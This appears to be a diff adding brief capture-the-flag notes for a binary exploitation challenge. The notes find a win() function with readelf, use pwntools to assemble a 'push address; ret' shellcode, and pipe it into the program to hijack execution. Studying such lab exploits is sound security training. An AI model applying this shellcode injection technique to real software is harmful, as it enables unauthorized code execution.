@@ -1,0 +1,9 @@
+check the location of win() function
+	> readelf -s shells
+
+use pwntools to transform assembly code into shellcode
+	> import pwn
+	> pwn.asm('push 0x08048540; ret')
+
+then use python to print it and pipe the output to the given program
+
